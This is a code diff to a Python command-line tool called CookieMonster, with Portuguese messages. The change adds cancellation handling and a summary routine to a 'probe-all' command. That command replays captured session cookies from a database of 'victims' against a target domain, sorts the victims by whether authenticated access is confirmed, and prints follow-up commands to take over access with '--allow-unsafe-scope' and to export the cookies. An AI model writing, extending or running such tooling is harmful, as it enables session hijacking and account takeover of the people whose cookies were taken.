@@ -2,6 +2,14 @@
 
 from __future__ import annotations
 
+import os
+import signal
+import sys
+import threading
+import time
+from collections import Counter
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
 import click
 
 from pathlib import Path
@@ -320,9 +328,6 @@ def probe_all(db_path: Path, domain: str, limit: int, channel: str,
     Para grandes datasets, combine --limit N (top N vitimas por auth) com
     --channel httpx (probe rapido, ~1s/vitima) para triagem.
     """
-    import time
-    from collections import Counter
-    from concurrent.futures import ThreadPoolExecutor, as_completed
     from .util import scope as scope_util
 
     store = _load_store(str(db_path))
@@ -340,7 +345,7 @@ def probe_all(db_path: Path, domain: str, limit: int, channel: str,
     console.print(f"[bold bright_white]=== CookieMonster: probe-all {domain} ===[/]")
     console.print(f"  Total de vitimas candidatas: [yellow]{len(victims)}[/yellow]")
     console.print(f"  Canal: {channel}  Workers: {workers}  Replay-mode: {replay_mode}")
-    console.print(f"  (inicando paralelo, isso pode levar minutos...)\n")
+    console.print(f"  [dim]Pressione Ctrl+C a qualquer momento para cancelar graciosamente.[/dim]\n")
 
     start = time.time()
     results = []
@@ -357,28 +362,102 @@ def probe_all(db_path: Path, domain: str, limit: int, channel: str,
         except Exception as exc:
             return {"victim_id": vid, "state": "ERROR", "error": str(exc)}
 
-    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
-        futs = [pool.submit(run_for, v) for v in victims]
-        for i, fut in enumerate(as_completed(futs), 1):
-            r = fut.result()
-            results.append(r)
-            elapsed = time.time() - start
-            avg = elapsed / i
-            eta = max(0, avg * (len(victims) - i))
-            tag = r.get("state", "?")
-            color = {"CONFIRMED": "green", "LIKELY": "cyan",
-                     "ANONYMOUS": "red", "UNKNOWN": "yellow",
-                     "NO_COOKIES": "dim", "ERROR": "red"}.get(tag, "dim")
-            console.print(
-                f"[{i}/{len(victims)}] {elapsed:5.0f}s (eta {eta:4.0f}s) "
-                f"vid=[yellow]{r['victim_id']:>5}[/] "
-                f"state=[{color}]{tag:9}[/] auth={r.get('auth', 0)}",
-                highlight=False)
+    cancelled = [False]
 
-    # Sumario por estado
-    elapsed = time.time() - start
+    def _sigint(_signum, _frame):
+        if cancelled[0]:
+            console.print("\n[bold red]Forcando abort...[/bold red]")
+            os._exit(1)
+        cancelled[0] = True
+        console.print("\n[bold yellow]>>> Ctrl+C detectado. Aguardando workers atuais finalizarem...[/bold yellow]")
+        console.print("[dim]    (pressione Ctrl+C de novo para forcar abort)[/dim]")
+
+    def _watch_keypress():
+        """Em Windows: fica checando ENTER via msvcrt. Em outros: usa select stdin."""
+        try:
+            import msvcrt  # type: ignore
+            while not cancelled[0]:
+                if msvcrt.kbhit():
+                    ch = msvcrt.getwch()
+                    if ch in ("\r", "\n", "q", "Q"):
+                        cancelled[0] = True
+                        console.print("\n[bold yellow]>>> Tecla pressionada. Aguardando workers atuais finalizarem...[/bold yellow]")
+                        break
+                time.sleep(0.1)
+        except ImportError:
+            # Linux/Mac: select em stdin
+            import select
+            try:
+                while not cancelled[0]:
+                    rlist, _, _ = select.select([sys.stdin], [], [], 0.2)
+                    if rlist:
+                        line = sys.stdin.readline()
+                        if not line or line.strip() in ("", "q", "Q"):
+                            cancelled[0] = True
+                            console.print("\n[bold yellow]>>> ENTER detectado. Aguardando workers atuais finalizarem...[/bold yellow]")
+                            break
+            except Exception:
+                pass
+
+    old_handler = None
+    try:
+        old_handler = signal.signal(signal.SIGINT, _sigint)
+    except (ValueError, OSError):
+        pass
+
+    key_thread = threading.Thread(target=_watch_keypress, daemon=True)
+    key_thread.start()
+
+    try:
+        with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
+            futs = {pool.submit(run_for, v): v["victim_id"] for v in victims}
+            try:
+                for i, fut in enumerate(as_completed(futs), 1):
+                    if cancelled[0]:
+                        break
+                    try:
+                        r = fut.result(timeout=None)
+                    except Exception as exc:
+                        r = {"victim_id": futs[fut], "state": "ERROR", "error": str(exc)}
+                    results.append(r)
+                    elapsed = time.time() - start
+                    avg = elapsed / i
+                    eta = max(0, avg * (len(victims) - i))
+                    tag = r.get("state", "?")
+                    color = {"CONFIRMED": "green", "LIKELY": "cyan",
+                             "ANONYMOUS": "red", "UNKNOWN": "yellow",
+                             "NO_COOKIES": "dim", "ERROR": "red"}.get(tag, "dim")
+                    console.print(
+                        f"[{i}/{len(victims)}] {elapsed:5.0f}s (eta {eta:4.0f}s) "
+                        f"vid=[yellow]{r['victim_id']:>5}[/] "
+                        f"state=[{color}]{tag:9}[/] auth={r.get('auth', 0)}",
+                        highlight=False)
+            finally:
+                if cancelled[0]:
+                    for fut in futs:
+                        fut.cancel()
+                    pool.shutdown(wait=False, cancel_futures=True)
+    finally:
+        if old_handler is not None:
+            try:
+                signal.signal(signal.SIGINT, old_handler)
+            except Exception:
+                pass
+
+    if cancelled[0]:
+        console.print(f"\n[bold yellow]=== CANCELADO ===[/bold yellow]")
+        console.print(f"  Runs completos antes do cancelamento: {len(results)}/{len(victims)}")
+        console.print(f"  [dim]Dica: use --limit N para reduzir o universo de vitimas.[/dim]")
+
+    _print_probe_all_summary(results, victims, domain, start_time=start, cancelled=cancelled[0])
+
+
+def _print_probe_all_summary(results, victims, domain, start_time=None, cancelled=False):
+    """Imprime o resumo por estado + tabela + destaque CONFIRMED/LIKELY."""
+    elapsed = (time.time() - start_time) if start_time else 0
     by_state = Counter(r.get("state", "?") for r in results)
-    console.print(f"\n[bold]Resumo ({elapsed:.0f}s, {len(results)} vitimas)[/bold]")
+    label = f"Resumo parcial" if cancelled else "Resumo"
+    console.print(f"\n[bold]{label} ({elapsed:.0f}s, {len(results)}/{len(victims)} vitimas)[/bold]")
     for state in ("CONFIRMED", "LIKELY", "ANONYMOUS", "UNKNOWN", "NO_COOKIES", "ERROR"):
         n = by_state.get(state, 0)
         if n:
@@ -393,7 +472,6 @@ def probe_all(db_path: Path, domain: str, limit: int, channel: str,
                      "ERROR": "red"}.get(state, "dim")
             console.print(f"  [{color}]{state:9}[/] ({pt}): {n}")
 
-    # Tabela compacta das vitimas
     console.print(f"\n[bold]Detalhes (top 30)[/bold]")
     console.print(f"  {'VID':>5}  {'STATE':>9}  {'CONF':>5}  {'AUTH':>4}  {'TOTAL':>5}  {'FINAL_URL':<60}")
     sorted_r = sorted(results, key=lambda r: (
@@ -410,7 +488,6 @@ def probe_all(db_path: Path, domain: str, limit: int, channel: str,
     if len(results) > 30:
         console.print(f"  [dim]...+ {len(results) - 30} mais[/dim]")
 
-    # Destaque CONFIRMED/LIKELY: comandos para replicar acesso
     confirmed = [r for r in results if r.get("state") == "CONFIRMED"]
     likely = [r for r in results if r.get("state") == "LIKELY"]
     if confirmed or likely:
@@ -424,7 +501,7 @@ def probe_all(db_path: Path, domain: str, limit: int, channel: str,
             console.print(f"  [dim]  python -m cookiemonster access --domain {domain} --victim {v['victim_id']} --allow-unsafe-scope[/dim]")
             console.print(f"  [dim]Exportar cookies:[/dim]")
             console.print(f"  [dim]  python -m cookiemonster export-cookies --domain {domain} --victim {v['victim_id']} -o {domain}_cookies.txt[/dim]")
-    else:
+    elif not cancelled:
         console.print(f"\n[bold yellow]>>> Nenhum acesso confirmado neste dominio.[/]")
         console.print(f"  [dim]Tente com outro dominio do scope ou outro canal.[/dim]")
 
